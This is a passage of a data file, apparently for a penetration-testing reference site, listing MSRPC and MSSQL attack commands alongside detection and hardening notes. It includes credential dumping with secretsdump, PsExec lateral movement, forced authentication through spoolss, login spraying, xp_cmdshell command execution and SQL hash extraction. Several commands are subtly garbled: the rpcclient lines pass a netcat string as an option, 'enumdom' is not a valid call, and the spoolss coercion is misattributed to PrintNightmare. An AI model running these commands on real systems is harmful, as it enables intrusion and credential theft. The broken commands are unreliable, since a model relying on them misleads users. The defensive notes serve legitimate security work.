          "The impacket dumper prints every interface, its version and its endpoint, and it works well against servers that answer slowly.",
      },
      {
        title: "Enumerate domain objects",
        command: "rpcclient -U <user> -S 'nc -nv <target> 445' <target> -c 'enumdom'",
        detail:
          "The call returns the domain name, the server names and the group list. It is one of the richest enumeration commands in the RPC surface.",
      },
      {
        title: "Read the LSA policy",
        command: "rpcclient -U <user> -S 'nc -nv <target> 445' <target> -c 'lsaquery'",
        detail:
          "The LSA policy call exposes the domain name and the machine role, and it is usually reachable with any valid domain credential.",
      },
    ],
    attacks: [
      {
        title: "Anonymous interface enumeration",
        severity: "high",
        command: "nmap -sV -p 135 --script rpcinfo <target>",
        detail:
          "The endpoint mapper answers without a credential. The result is a complete list of the remote interfaces on the host, and therefore a list of the ways in.",
        detection:
          "Endpoint mapper requests from hosts that are not management or monitoring systems.",
        fix: "Restrict port 135 and the dynamic port range to the management network and to the hosts that genuinely need the RPC interfaces.",
      },
      {
        title: "Forced authentication through the spoolss interface",
        severity: "critical",
        command:
          "impacket-smbserver -smb2 -v <ip> -port 445\nrpcclient -U '' -N -S 'nc -nv <ip> 445' <target> -c 'spoolss'",
        detail:
          "The spoolss interface tries to load a printer driver from a remote share. Pointing it at a rogue SMB server makes the target authenticate to the attacker, which is how the PrintNightmare family of bugs turned into credential theft.",
        detection:
          "The target authenticating to an unexpected workstation, and Windows events showing a failed driver load from a network path.",
        fix: "Patch the spooler, disable the Print Spooler service where printing is not needed, and block outbound SMB and RPC to workstations.",
      },
      {
        title: "Null session exposure of the SAM and LSA",
        severity: "high",
        command: "impacket-secretsdump -no-pass -target-ip <target>",
        detail:
          "On a host with null sessions enabled, the named pipes exposed by the RPC interfaces return the local account database and the LSA secrets without any credential at all.",
        detection:
          "Null session logon events, and access to the SAM and LSA named pipes from hosts that are not domain controllers.",
        fix: "Restrict null sessions in the registry and the domain controller policy, and require firewalling of the anonymous RPC interfaces.",
      },
    ],
    postEx: [
      {
        title: "Turn the RPC surface into a credential dump",
        severity: "critical",
        command: "impacket-secretsdump <domain>/<user>:<password>@<target>",
        detail:
          "The tool asks the machine for the SAM, the LSA and the cached domain hashes over the same named pipes. A single valid domain account is usually enough.",
        detection:
          "Event 4662 with SAM, LSA or security object access from a host that is not a management server.",
        fix: "Apply least privilege to domain accounts, restrict the administrative shares, and alert on bulk SAM and LSA reads.",
      },
      {
        title: "Move laterally with the same interfaces",
        severity: "critical",
        command: "impacket-psexec <domain>/<user>:<password>@<target>",
        detail:
          "PsExec uses the RPC service manager over SMB to start a service, which gives a command shell as SYSTEM on the target. It is the standard lateral movement path in a Windows domain.",
        detection:
          "Service creation events with a service binary in a temporary directory, and event 7045 in the system log.",
        fix: "Block administrative shares from user networks, require privileged administration for service creation, and alert on event 7045.",
      },
      {
        title: "Map the domain through the RPC interfaces",
        severity: "medium",
        command:
          "rpcclient -U <user> -S 'nc -nv <target> 445' <target> -c 'enumdom'\nrpcclient -U <user> -S 'nc -nv <target> 445' <target> -c 'enumdomgroups'",
        detail:
          "The enumeration calls return the domain groups, the trusts and the servers, which tells you where to go next without needing any other protocol.",
        detection:
          "Enumeration calls in bulk from a host that is not a management station.",
        fix: "Log and review these calls, and limit them with a firewall that understands the RPC interfaces.",
      },
    ],
    commands: [
      { command: "nmap -sV -p 135 --script rpcinfo <target>", description: "Lists the registered RPC interfaces and their versions." },
      { command: "nmap -sV -p 135 --script msrpc-enum <target>", description: "Enumerates the MSRPC interfaces with the NSE library." },
      { command: "impacket-rpcdump -target-ip <target>", description: "Dumps the RPC interface table with impacket." },
      { command: "rpcclient -U '' -N -S 'nc -nv <target> 445' <target> -c 'srvinfo'", description: "Returns the server name, version and domain." },
      { command: "rpcclient -U <user> -S 'nc -nv <target> 445' <target> -c 'enumdom'", description: "Enumerates the domain users and groups." },
      { command: "rpcclient -U <user> -S 'nc -nv <target> 445' <target> -c 'enumdomgroups'", description: "Enumerates the domain groups." },
      { command: "rpcclient -U <user> -S 'nc -nv <target> 445' <target> -c 'lsaquery'", description: "Reads the LSA policy information." },
      { command: "rpcclient -U '' -N -S 'nc -nv <target> 445' <target> -c 'spoolss'", description: "Calls the spoolss interface, which triggers the forced authentication." },
      { command: "impacket-secretsdump <domain>/<user>:<password>@<target>", description: "Dumps the SAM, LSA and cached secrets." },
      { command: "impacket-psexec <domain>/<user>:<password>@<target>", description: "Runs a command as SYSTEM over the RPC service manager." },
    ],
    hardening: [
      {
        title: "Restrict RPC to the management network",
        detail:
          "Firewall port 135 and the dynamic range 49152 to 65535 so that only the management and monitoring hosts can reach the RPC interfaces.",
      },
      {
        title: "Patch the platform",
        detail:
          "The most serious remote RPC issues, including the spooler driver bug and the relay variants, are fixed in current Windows builds.",
      },
      {
        title: "Disable what is not needed",
        detail:
          "Turn off the Print Spooler on servers that do not print, and remove the other RPC-hosted services that the host does not use.",
      },
      {
        title: "Require SMB signing and modern authentication",
        detail:
          "Signing blocks the relay and tampering variants, and modern authentication removes the paths that rely on NTLM.",
      },
      {
        title: "Limit the named pipes",
        detail:
          "Use the SMB firewall settings to restrict access to the sensitive named pipes such as the SAM and LSA pipes to domain controllers and administrators.",
      },
      {
        title: "Monitor the interface use",
        detail:
          "Alert on endpoint mapper activity from new sources, on spooler driver loads and on service creation events with a network source.",
      },
    ],
    tools: ["nmap", "impacket", "netcat", "rpcclient", "crackmapexec", "bloodhound-ce"],
  },
  {
    slug: "mssql",
    name: "MSSQL",
    port: 1433,
    protocol: "tcp",
    risk: "high",
    tags: ["database", "windows", "sql"],
    summary:
      "SQL Server speaks TDS over TCP, and by default it logs every successful login to the error log, which makes it one of the easiest databases to test with a legitimate wordlist. The interesting findings are the ones where a weak credential belongs to an account with more privilege than it needs. Once you are in as a sysadmin, xp_cmdshell hands you the operating system. Port 1433 should never be reachable from a user network, so any exposure of it is worth a conversation on its own.",
    connect: [
      {
        label: "sqlcmd",
        command: "sqlcmd -S <target>,1433 -U <user> -P <password> -Q 'SELECT @@VERSION'",
        detail:
          "The login works with a SQL login or a Windows account in domain\\user format. Remember that the password on the command line is visible in the process list.",
      },
      {
        label: "impacket client",
        command: "impacket-mssqlclient <domain>/<user>:<password>@<target>",
        detail:
          "The impacket client speaks TDS properly, which matters when the server enforces encryption and you want to test the negotiation rather than fight it.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 1433 --script ms-sql-info <target>",
        detail:
          "The script reads the server banner and reports the version and whether the instance allows a null session or an unauthenticated login.",
      },
      {
        title: "Check the pre-login response",
        command: "nmap -p 1433 --script ms-sql-info --script-args 'ms-sql-info.safe=true' <target>",
        detail:
          "The safe mode avoids the crash that an old script caused on newer builds and still gives the banner and the supported encryption options.",
      },
      {
        title: "Look for the instance ports",
        command: "nmap -sV -p 1433,1434 <target>",
        detail:
          "1433 is the default instance and named instances use dynamic ports. The browser service on 1434 will list the named instances and their ports.",
      },
    ],
    enumeration: [
      {
        title: "List the databases",
        command: "sqlcmd -S <target> -U <user> -P <password> -Q 'SELECT name FROM sys.databases'",
        detail:
          "The database names describe the business, and the presence of msdb and model alongside application databases tells you what kind of server this is.",
      },
      {
        title: "Spray the logins",
        command: "nmap -p 1433 --script ms-sql-brute --script-args 'userdb=/usr/share/nmap/nselib/data/usernames.lst,passdb=/usr/share/nmap/nselib/data/passwords.lst' <target>",
        detail:
          "SQL Server logs successful and failed logins, so the spray will leave a clear trace. Keep it short and document what you tried.",
      },
      {
        title: "Check your own privileges",
        command: "sqlcmd -S <target> -U <user> -P <password> -Q \"SELECT IS_SRVROLEMEMBER('sysadmin')\"",
        detail:
          "The return value is the single most useful thing to establish early. sysadmin means the instance is effectively a domain controller in terms of what it can reach.",
      },
    ],
    attacks: [
      {
        title: "Weak or default administrative credentials",
        severity: "critical",
        command: "sqlcmd -S <target>,1433 -U sa -P <password> -Q 'SELECT @@VERSION'",
        detail:
          "The sa account is the classic entry point. It is often renamed, but the account still exists and the password is sometimes the installation password left unchanged, or a blank one on an old install.",
        detection:
          "Event 18456 in the SQL error log for each failed login, and successful logins by sa from an address that is not an administration host.",
        fix: "Disable the sa login for routine work, rotate its password, and manage the instance with a named account held in the enterprise credential store.",
      },
      {
        title: "xp_cmdshell for operating system access",
        severity: "critical",
        command: "sqlcmd -S <target> -U sa -P <password> -Q \"EXEC xp_cmdshell 'whoami'\"",
        detail:
          "As sysadmin you can run operating system commands directly from the database. On older default installations the service runs as LocalSystem, which means domain privileges as well.",
        detection:
          "xp_cmdshell appearing in the SQL trace and the error log, and a child process appearing under the SQL Server service.",
        fix: "Disable xp_cmdshell, run the SQL service under a dedicated low privilege virtual account, and restrict who can be sysadmin.",
      },
      {
        title: "Linked server abuse",
        severity: "high",
        command:
          "sqlcmd -S <target> -U sa -P <password> -Q \"EXEC sp_addlinkedsrvlogin @server='<dc>',@useself='false',@rmtuser='<user>',@rmtpassword='<password>'; EXEC sp_addlinkedserver @server='<dc>', @srv_product='', @provider='SQLNCLI', @datasrc='<dc>'\"",
        detail:
          "A linked server that points at a domain controller gives the SQL instance a path to the directory and to the credential store of that domain controller, which is a direct path to domain compromise.",
        detection:
          "sp_addlinkedserver and sp_addlinkedsrvlogin calls, and outbound connections from the SQL host to domain controllers.",
        fix: "Remove unneeded linked servers, restrict the ones that remain, and treat the SQL service account as a privileged identity.",
      },
    ],
    postEx: [
      {
        title: "Enable xp_cmdshell if it was turned off",
        severity: "critical",
        command:
          "sqlcmd -S <target> -U sa -P <password> -Q \"EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE\"",
        detail:
          "Disabling the feature does not remove the capability from a sysadmin, it only adds a step. The same privilege level allows it to be turned back on.",
        detection:
          "sp_configure calls and a change in the xp_cmdshell setting recorded in the SQL trace.",
        fix: "Keep xp_cmdshell disabled, keep sysadmin membership small, and alert on any change to the advanced options.",
      },
      {
        title: "Dump the SQL login hashes",
        severity: "high",
        command:
          "sqlcmd -S <target> -U sa -P <password> -Q \"SELECT name, password_hash FROM sys.sql_logins\"\nsqlcmd -S <target> -U sa -P <password> -Q \"EXEC master.dbo.sp_helplogins\"",
        detail:
          "The hash is a salted hash that can be cracked offline, and the helper shows which logins are sysadmin. Windows logins are worth listing too, because their passwords are domain credentials.",
        detection:
          "Reads of sys.sql_logins and calls to sp_helplogins from an account that does not normally administer the instance.",
        fix: "Move the instance into a managed identity platform, rotate the login passwords, and remove the sa account from routine administration.",
      },
      {
        title: "Read the jobs and the linked servers",
        severity: "medium",
        command:
          "sqlcmd -S <target> -U sa -P <password> -Q \"SELECT name FROM msdb.dbo.sysjobs\"\nsqlcmd -S <target> -U sa -P <password> -Q \"SELECT name FROM sys.servers\"",
        detail:
          "Agent jobs often run PowerShell as the SQL service account, and the linked servers list shows the internal systems this instance has been given a route to.",
        detection:
          "Job listings and sys.servers queries from an account that is not part of the administration group.",
        fix: "Review the jobs and their owners, remove stale jobs, and give each linked server the narrowest rights that work.",
      },
    ],
    commands: [
      { command: "sqlcmd -S <target>,1433 -U <user> -P <password> -Q 'SELECT @@VERSION'", description: "Connects and returns the server version." },
      { command: "sqlcmd -S <target> -U <user> -P <password> -Q 'SELECT name FROM sys.databases'", description: "Lists the databases on the instance." },
      { command: "sqlcmd -S <target> -U <user> -P <password> -Q \"SELECT IS_SRVROLEMEMBER('sysadmin')\"", description: "Checks whether the login is a sysadmin." },
      { command: "sqlcmd -S <target> -U <user> -P <password> -Q \"EXEC xp_cmdshell 'whoami'\"", description: "Runs an operating system command from the database." },
      { command: "sqlcmd -S <target> -U <user> -P <password> -Q 'SELECT name, password_hash FROM sys.sql_logins'", description: "Lists the SQL logins with their hashes." },
      { command: "sqlcmd -S <target> -U <user> -P <password> -Q 'SELECT name FROM sys.servers'", description: "Lists the linked servers." },
      { command: "sqlcmd -S <target> -U <user> -P <password> -Q 'SELECT name FROM msdb.dbo.sysjobs'", description: "Lists the SQL Agent jobs." },
      { command: "sqlcmd -S <target> -U <user> -P <password> -Q 'SELECT @@SERVERNAME, SYSTEM_USER'", description: "Shows the instance name and the login identity." },
      { command: "nmap -p 1433 --script ms-sql-info,ms-sql-brute <target>", description: "Fingerprints the instance and sprays a wordlist." },
      { command: "impacket-mssqlclient <domain>/<user>:<password>@<target>", description: "Connects with the impacket TDS client." },
    ],
    hardening: [
      {
        title: "Disable the sa login",
        detail:
          "Turn off the sa login for routine administration, rename it if the platform allows, and give it a long generated password in the credential store.",
      },
      {
        title: "Manage with Windows authentication",
        detail:
          "Prefer integrated authentication over SQL logins so that the database benefits from the domain's group policy, lockout and conditional access.",
      },
      {
        title: "Keep 1433 off the network",
        detail:
          "Do not expose the instance port to user networks. Use a gateway or a dedicated application network segment and enforce it at the firewall.",
      },
      {
        title: "Disable the dangerous features",
        detail:
          "Turn off xp_cmdshell and review the other extended stored procedures such as Ole Automation Procedures, which are equally capable.",
      },
      {
        title: "Require encryption",
        detail:
          "Force TLS for the TDS connection with certificate validation, so that the login and the data are not readable on the network.",
      },
      {
        title: "Audit the logins and the error log",
        detail:
          "Review the error log for event 18456 on failed logins and for successful logins from unusual addresses, and alert on the queries that read the credential tables.",
      },
    ],
    tools: ["nmap", "sqlcmd", "impacket", "hydra", "netexec", "metasploit"],
  },
];
